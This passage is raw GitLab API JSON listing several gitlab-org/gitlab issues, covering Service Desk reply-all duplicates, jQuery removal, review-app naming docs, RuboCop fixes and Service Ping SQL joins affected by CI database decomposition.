Belokolodov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9712164/avatar.png","web_url":"https://gitlab.com/nbelokolodov"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337609","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337609","notes":"https://gitlab.com/api/v4/projects/278964/issues/337609/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337609/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337609","relative":"#337609","full":"gitlab-org/gitlab#337609"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6371,"epic":{"id":309188,"iid":6371,"title":"Version-App maintenance","url":"/groups/gitlab-org/-/epics/6371","group_id":9970,"human_readable_end_date":"Mar 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e months remaining"},"iteration":null,"health_status":null},{"id":91416451,"iid":337608,"project_id":278964,"title":"Prevent multiple Service Desk issues created by cc'd recipients using 'Reply All'","description":"Currently when a cc'd recipient (or, I suppose, anyone who has received the email - bcc, fwd, etc) uses Reply-All, another Service Desk issue is created with the contents of their reply.\n\nWe should ensure that external participants do not inadvertently create noisy issues this way, as without this check it would create multiple Service Desk issues with all the recipients as external participants.\n\n[To reproduce](https://gitlab.com/gitlab-org/gitlab/-/issues/337608#note_642662553):\n\n1. Send email to a service desk and another email account\n1. Service Desk issue gets created -\u003e awesome\n1. Reply from the other email account\n1. Another Service Desk issue gets created -\u003e ideally this would get added as a note on the original issue iso a new issue\n\nTo address:\n\nWe should ensure that any reply to an existing SD issue gets added as a note to that issue and not as a new issue. If we can't identify/deduce by subject/content we may need to add metadata somehow?\n\n- we should store `message_id` from the email and check if the email is not a reply to the email that created the issue","state":"closed","created_at":"2021-08-04T07:27:38.915Z","updated_at":"2023-01-12T00:33:16.862Z","closed_at":"2021-12-08T18:20:01.923Z","closed_by":{"id":508743,"username":"jarka","name":"Jarka Košanová","state":"active","avatar_url":"https://secure.gravatar.com/avatar/3931dae84deb01d2881e4909077b8dbe?s=80\u0026d=identicon","web_url":"https://gitlab.com/jarka"},"labels":["Category:Service Desk","Deliverable","Next Up","backend","devops::plan","feature::enhancement","group::respond","missed-deliverable","missed:14.3","missed:14.4","missed:14.5","reliability","section::dev","type::feature","workflow::verification"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":508743,"username":"jarka","name":"Jarka Košanová","state":"active","avatar_url":"https://secure.gravatar.com/avatar/3931dae84deb01d2881e4909077b8dbe?s=80\u0026d=identicon","web_url":"https://gitlab.com/jarka"}],"author":{"id":3717078,"username":"cablett","name":"charlie ablett","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3717078/avatar.png","web_url":"https://gitlab.com/cablett"},"type":"ISSUE","assignee":{"id":508743,"username":"jarka","name":"Jarka Košanová","state":"active","avatar_url":"https://secure.gravatar.com/avatar/3931dae84deb01d2881e4909077b8dbe?s=80\u0026d=identicon","web_url":"https://gitlab.com/jarka"},"user_notes_count":22,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337608","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337608","notes":"https://gitlab.com/api/v4/projects/278964/issues/337608/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337608/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337608","relative":"#337608","full":"gitlab-org/gitlab#337608"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3758,"epic":{"id":74398,"iid":3758,"title":"Add issue participants via email address","url":"/groups/gitlab-org/-/epics/3758","group_id":9970,"human_readable_end_date":"Dec 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91414695,"iid":337605,"project_id":278964,"title":"Refactor app/assets/javascripts/integrations/integration_settings_form.js to not depend on jQuery","description":"File: `app/assets/javascripts/integrations/integration_settings_form.js`","state":"closed","created_at":"2021-08-04T06:52:50.506Z","updated_at":"2022-11-22T19:36:25.291Z","closed_at":"2021-10-04T23:47:10.637Z","closed_by":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"labels":["Deliverable","auto updated","bug::performance","devops::manage","frontend","frontend-weight::2","group::integrations","maintenance::refactor","reliability","section::dev","type::maintenance","workflow::production"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"}],"author":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"type":"ISSUE","assignee":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337605","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337605","notes":"https://gitlab.com/api/v4/projects/278964/issues/337605/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337605/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337605","relative":"#337605","full":"gitlab-org/gitlab#337605"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91414587,"iid":337603,"project_id":278964,"title":"Document to use `name: review/$CI_COMMIT_REF_SLUG`  instead of `review/$CI_COMMIT_REF_NAME` for review apps","description":"## Problem\n\nPointed out by [the comment](https://gitlab.com/gitlab-org/gitlab/-/issues/21182#note_642304183) by @hfyngvason.\n\nCurrently, our documentation recommends to use `environment: review/$CI_COMMIT_REF_NAME` for configuring review apps, however, this sometimes causes an environment creation error by an invalid name. Users should use `$CI_COMMIT_REF_SLUG` instead, that automatically sanitizes/normalizes the invalid invalid characters.\n\n## Proposal\n\nReplace `environment: review/$CI_COMMIT_REF_NAME` by `environment: review/$CI_COMMIT_REF_SLUG`.","state":"closed","created_at":"2021-08-04T06:50:31.956Z","updated_at":"2021-09-10T00:10:43.564Z","closed_at":"2021-09-10T00:10:43.546Z","closed_by":{"id":4155490,"username":"marcel.amirault","name":"Marcel Amirault","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4155490/avatar.png","web_url":"https://gitlab.com/marcel.amirault"},"labels":["Category:Continuous Delivery","Technical Writing","[deprecated] Accepting merge requests","auto updated","devops::release","documentation","group::release","section::ops","workflow::ready for development"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":6742251,"username":"feistel","name":"feistel","state":"active","avatar_url":"https://secure.gravatar.com/avatar/40569112d16323eb878ebdead2117943?s=80\u0026d=identicon","web_url":"https://gitlab.com/feistel"}],"author":{"id":758045,"username":"shinya.maeda","name":"Shinya Maeda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/758045/avatar.png","web_url":"https://gitlab.com/shinya.maeda"},"type":"ISSUE","assignee":{"id":6742251,"username":"feistel","name":"feistel","state":"active","avatar_url":"https://secure.gravatar.com/avatar/40569112d16323eb878ebdead2117943?s=80\u0026d=identicon","web_url":"https://gitlab.com/feistel"},"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337603","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337603","notes":"https://gitlab.com/api/v4/projects/278964/issues/337603/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337603/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337603","relative":"#337603","full":"gitlab-org/gitlab#337603"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91414547,"iid":337602,"project_id":278964,"title":"Remove jQuery from Jira Connect App","description":"We're including jQuery in the Jira Connect App even though (I think) we no longer depend on jQuery. The goal of this issue is to:\n\n- verify that Jira Connect App works without jquery (https://gitlab.com/gitlab-org/gitlab/blob/master/app/controllers/jira_connect/subscriptions_controller.rb#L10)\n- Remove jquery","state":"closed","created_at":"2021-08-04T06:49:47.573Z","updated_at":"2022-11-22T19:36:25.953Z","closed_at":"2021-11-02T07:14:54.488Z","closed_by":{"id":4704683,"username":"justin_ho","name":"Justin Ho Tuan Duong","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4704683/avatar.png","web_url":"https://gitlab.com/justin_ho"},"labels":["Deliverable","Integration::Jira","Jira::ConnectApp","auto updated","bug::performance","devops::manage","frontend","frontend-weight::1","group::integrations","maintenance::refactor","missed-deliverable","missed:14.4","reliability","section::dev","type::maintenance"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[{"id":4704683,"username":"justin_ho","name":"Justin Ho Tuan Duong","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4704683/avatar.png","web_url":"https://gitlab.com/justin_ho"}],"author":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"type":"ISSUE","assignee":{"id":4704683,"username":"justin_ho","name":"Justin Ho Tuan Duong","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4704683/avatar.png","web_url":"https://gitlab.com/justin_ho"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337602","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337602","notes":"https://gitlab.com/api/v4/projects/278964/issues/337602/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337602/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337602","relative":"#337602","full":"gitlab-org/gitlab#337602"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91406591,"iid":337596,"project_id":278964,"title":"Fix remaining cop offenses for Graphql/Descriptions","description":"The `Graphql/Descriptions` cop was extended to cover descriptions the start with \"A\" or \"The\" https://gitlab.com/gitlab-org/gitlab/-/merge_requests/67473.\n\nThis issue is to track fixing the existing offenses that were added to `.rubocop_manual_todo.yml`.","state":"closed","created_at":"2021-08-04T02:31:57.529Z","updated_at":"2022-11-22T19:36:27.266Z","closed_at":"2021-09-15T00:50:51.846Z","closed_by":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"labels":["GraphQL","auto updated","devops::manage","group::integrations","maintenance::refactor","section::dev","type::maintenance"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"}],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337596","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337596","notes":"https://gitlab.com/api/v4/projects/278964/issues/337596/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337596/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337596","relative":"#337596","full":"gitlab-org/gitlab#337596"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91402548,"iid":337586,"project_id":278964,"title":"Ensure Service Ping generation is compatible with DB decomposition","description":"As mentioned in https://gitlab.com/groups/gitlab-org/-/epics/6407#note_640891143, Service Ping does some joins over `ci_*` tables, which will be decomposed into a separate logical database as part of \u00266167:\n\n```ruby\n\"sast_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 1 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success'))\",\n      \"dependency_scanning_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 2 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success'))\",\n      \"container_scanning_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 3 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success'))\",\n      \"dast_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 4 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success'))\",\n      \"secret_detection_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 5 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success'))\",\n      \"coverage_fuzzing_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 6 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success'))\",\n      \"api_fuzzing_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 7 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success'))\",\n      \"cluster_image_scanning_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 8 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success'))\",\n\n\"sast_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 1 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success')) AND \\\"security_scans\\\".\\\"created_at\\\" BETWEEN '2021-07-03 12:09:26.188626' AND '2021-07-31 12:09:26.188702'\",\n      \"dependency_scanning_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 2 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success')) AND \\\"security_scans\\\".\\\"created_at\\\" BETWEEN '2021-07-03 12:09:26.188626' AND '2021-07-31 12:09:26.188702'\",\n      \"container_scanning_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 3 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success')) AND \\\"security_scans\\\".\\\"created_at\\\" BETWEEN '2021-07-03 12:09:26.188626' AND '2021-07-31 12:09:26.188702'\",\n      \"dast_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 4 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success')) AND \\\"security_scans\\\".\\\"created_at\\\" BETWEEN '2021-07-03 12:09:26.188626' AND '2021-07-31 12:09:26.188702'\",\n      \"secret_detection_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 5 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success')) AND \\\"security_scans\\\".\\\"created_at\\\" BETWEEN '2021-07-03 12:09:26.188626' AND '2021-07-31 12:09:26.188702'\",\n      \"coverage_fuzzing_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 6 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success')) AND \\\"security_scans\\\".\\\"created_at\\\" BETWEEN '2021-07-03 12:09:26.188626' AND '2021-07-31 12:09:26.188702'\",\n      \"api_fuzzing_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 7 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success')) AND \\\"security_scans\\\".\\\"created_at\\\" BETWEEN '2021-07-03 12:09:26.188626' AND '2021-07-31 12:09:26.188702'\",\n      \"cluster_image_scanning_scans\": \"SELECT COUNT(\\\"security_scans\\\".\\\"build_id\\\") FROM \\\"security_scans\\\" INNER JOIN \\\"ci_builds\\\" ON \\\"ci_builds\\\".\\\"id\\\" = \\\"security_scans\\\".\\\"build_id\\\" AND \\\"ci_builds\\\".\\\"type\\\" = 'Ci::Build' WHERE \\\"security_scans\\\".\\\"scan_type\\\" = 8 AND (\\\"ci_builds\\\".\\\"retried\\\" = FALSE OR \\\"ci_builds\\\".\\\"retried\\\" IS NULL) AND (\\\"ci_builds\\\".\\\"status\\\" IN ('success')) AND \\\"security_scans\\\".\\\"created_at\\\" BETWEEN '2021-07-03 12:09:26.188626' AND '2021-07-31 12:09:26.188702'\",\n```\n\nAs part of https://gitlab.com/groups/gitlab-org/-/epics/6289, we've identified that in the current state, this will break with multiple databases, as SQL joins won't be able to span both logical databases.\n\n### Options\n\nDocs in https://docs.gitlab.com/ee/development/database/multiple_databases.html#removing-joins-between-ci_-and-non-ci_-tables suggest the following course of action:\n\n\u003e 1. Is the code even used? If not just remove it\n\u003e 2. If the code is used, then is this feature even used or can we implement the feature in a simpler way and still meet the requirements. Always prefer the simplest option.\n\u003e 3. Can we remove the join if we de-normalize the data you are joining to by adding a new column\n\u003e 4. Can we remove the join by adding a new table in the correct database that replicates the minimum data needed to do the join\n\nNo. 1 - the metrics listed above have been consistently broken, returning fallback values every Service Ping generation. We might consider just removing them altogether.\n\nConcerning no. 2, if we upgrade to Rails 7 or `disable_joins` is [backported](https://gitlab.com/gitlab-org/gitlab/-/issues/336420), the [`disable_joins`](https://edgeguides.rubyonrails.org/active_record_multiple_databases.html#handling-associations-with-joins-across-databases) argument can be used to easily make two separate queries. This will have some performance impact, as noted in Rails docs:\n\n\u003e There are some important things to be aware of with this option:\n\u003e \n\u003e 1) There may be performance implications since now two or more queries will be performed (depending on the association) rather than a join. If the select for humans returned a high number of IDs the select for treats may send too many IDs. 2) Since we are no longer performing joins, a query with an order or limit is now sorted in-memory since order from one table cannot be applied to another table. 3) This setting must be added to all associations where you want joining to be disabled. Rails can't guess this for you because association loading is lazy, to load treats in @dog.treats Rails already needs to know what SQL should be generated.\n\nWe could also do two separate queries to both databases during the batch count and join the records manually in the application.\n\nIf a simpler implementation is not be possible or the performance impact is too great, we will have to denormalize the columns we need (`type`, `retries`, `status`) as suggested in no. 3 and no. 4, to avoid the joins over `ci_builds`.","state":"closed","created_at":"2021-08-03T23:48:57.872Z","updated_at":"2021-08-09T13:44:07.592Z","closed_at":"2021-08-09T13:31:03.116Z","closed_by":{"id":3509693,"username":"nicolasdular","name":"Nicolas Dular","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c4a21f15150c12ddf13fd848597cddd9?s=80\u0026d=identicon","web_url":"https://gitlab.com/nicolasdular"},"labels":["Unplanned","auto updated","backend","database","devops::growth","group::product intelligence","section::growth","won't do","workflow::in dev"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"}],"author":{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"},"type":"ISSUE","assignee":{"id":8013274,"username":"pskorupa","name":"Piotr 